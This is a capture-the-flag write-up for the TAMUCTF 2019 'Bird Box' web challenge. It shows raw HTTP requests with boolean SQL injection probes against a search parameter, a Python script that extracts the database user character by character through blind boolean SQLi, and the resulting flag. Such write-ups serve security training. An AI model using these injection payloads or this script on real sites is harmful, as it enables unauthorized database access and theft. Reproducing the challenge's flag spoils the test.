## Web4 Bird Box

http://web2.tamuctf.com
We've got Aggies, Trucks, and Eggs!

Difficulty: hard




GET /Search.php?Search=something HTTP/1.1
Host: web2.tamuctf.com
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
DNT: 1
Referer: http://web2.tamuctf.com/
Accept-Encoding: gzip, deflate
Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close



HTTP/1.1 500 Internal Server Error
Server: nginx/1.15.8
Date: Sat, 02 Mar 2019 02:43:40 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 212
Connection: close

<html><head><style>img{ display: block; margin-left: auto; margin-right: auto; width: 75%; height: 75%;}h1{ text-align: center; }</style></head></br><h1>Our search isn't THAT good...</h1></br><img src='Ehhh.png'>





GET /Search.php?Search=Eggs HTTP/1.1
Host: web2.tamuctf.com
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
DNT: 1
Referer: http://web2.tamuctf.com/
Accept-Encoding: gzip, deflate
Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close



HTTP/1.1 500 Internal Server Error
Server: nginx/1.15.8
Date: Sat, 02 Mar 2019 02:44:28 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 193
Connection: close

<html><head><style>img{ display: block; margin-left: auto; margin-right: auto; width: 75%; height: 75%;}h1{ text-align: center; }</style></head></br><h1>Eggs</h1></br><img src='Happy_Eggs.png'>






### SQLi

GET /Search.php?Search=Eggs'+and+1=1--+- HTTP/1.1
Host: web2.tamuctf.com
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
DNT: 1
Referer: http://web2.tamuctf.com/
Accept-Encoding: gzip, deflate
Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close


-> evaluate to TRUE


HTTP/1.1 500 Internal Server Error
Server: nginx/1.15.8
Date: Sat, 02 Mar 2019 02:45:11 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 193
Connection: close

<html><head><style>img{ display: block; margin-left: auto; margin-right: auto; width: 75%; height: 75%;}h1{ text-align: center; }</style></head></br><h1>Eggs</h1></br><img src='Happy_Eggs.png'>



GET /Search.php?Search=Eggs'+and+1=2--+- HTTP/1.1
Host: web2.tamuctf.com
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
DNT: 1
Referer: http://web2.tamuctf.com/
Accept-Encoding: gzip, deflate
Accept-Language: pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close


-> evaluate to FALSE

HTTP/1.1 500 Internal Server Error
Server: nginx/1.15.8
Date: Sat, 02 Mar 2019 02:45:28 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 212
Connection: close

<html><head><style>img{ display: block; margin-left: auto; margin-right: auto; width: 75%; height: 75%;}h1{ text-align: center; }</style></head></br><h1>Our search isn't THAT good...</h1></br><img src='Ehhh.png'>



# Exploitation - Blind Boolean-based SQLi (birdbox_exploit.py)

No SELECT allowed

```
#!/usr/bin/env python
# TAMUCTF 2019 Web2 Bird Box Challenge exploit

import ctfpwn
import urllib

# SELECT table_name FROM information_schema.tables WHERE table_schema="sqlidb"


base_url = "http://web2.tamuctf.com/Search.php?Search=Eggs' and "
resp = ctfpwn.http_get('http://web2.tamuctf.com/Search.php?Search=Eggs')
payload = ''

# """substring("SELECT column FROM information_schema.columns WHERE table_schema=database())",1,{})="{}"--%20-"""
while 'Eggs' in resp:
    for c in ctfpwn.get_character_set(lc=True, uc=True, nb=True, sc=True):
        current_payload = payload + c
        url = base_url + \
            "substring(user(),1,{})='{}'--%20-".format(len(current_payload),
                                                       current_payload)
        resp = ctfpwn.http_get(url)
        if 'Eggs' in resp:
            payload = payload + c
            break
    print payload
```



database name: sqlidb
username: gigem{w3_4r3_th3_4ggi3s}

